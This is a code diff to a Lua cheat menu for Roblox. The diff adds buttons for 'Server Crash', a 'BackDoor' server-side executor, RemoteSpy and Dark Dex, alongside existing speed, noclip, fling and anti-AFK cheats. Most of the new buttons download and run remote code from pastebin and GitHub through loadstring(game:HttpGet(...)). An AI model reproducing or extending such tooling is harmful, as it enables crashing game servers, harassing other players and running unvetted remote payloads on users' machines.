@@ -13,7 +13,8 @@ local ESP = Window:NewTab("ESP")
 --SECTIONS
 local PhysicalAct = PlayerState:NewSection("Physical Action")
 local AdvancedAct = PlayerState:NewSection("Advanced Action")
-local Basic = Basic:NewSection("Basics")
+local BasicSec = Basic:NewSection("Basics")
+local DeepHacks = DeepHack:NewSection("Deep Exploit")
 
 --EVERYTHING
 PhysicalAct:NewSlider("WalkSpeed", "ToggleSpeed", 400, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
@@ -44,7 +45,7 @@ AdvancedAct:NewToggle("NoClip", "Toggle NoClip", function(state)
     end
 end)
 
-Basic:NewButton("FE Fling", "Fling Players", function()
+BasicSec:NewButton("FE Fling", "Fling Players", function()
 local lp = game:FindService("Players").LocalPlayer
 
 local function gplr(String)
@@ -171,11 +172,11 @@ TextButton.MouseButton1Click:Connect(function()
 end)
 end)
 
-Basic:NewButton("Mobile Keyboard", "Toggle MK", function()
+BasicSec:NewButton("Mobile Keyboard", "Toggle MK", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
 end)
 
-Basic:NewButton("AntiAFK", "AFK", function()
+BasicSec:NewButton("AntiAFK", "AFK", function()
     local vu = game:GetService("VirtualUser")
 game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
@@ -184,14 +185,26 @@ game:GetService("Players").LocalPlayer.Idled:connect(function()
 end)
 end)
 
+BasicSec:NewButton("Server Crash", "Crash Server", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/HGBJqVMu",true))()
+end)
 
+BasicSec:NewButton("RemoveFog", "RemoveFog", function()
+    game.Lighting.FogEnd = 100000000000
+    game.Lighting.FogStart = 10000000000
+end)
 
+DeepHacks:NewButton("RemoteSpy", "Spying", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/Forked/M%3ASimpleSpy%20V3",true))()
+end)
 
+DeepHacks:NewButton("Dark Dex", "Explorer", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
+end)
 
-
-
-
-
+DeepHacks:NewButton("BackDoor", "ServerSide Excutor", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua", true))()
+end)
 
 
 
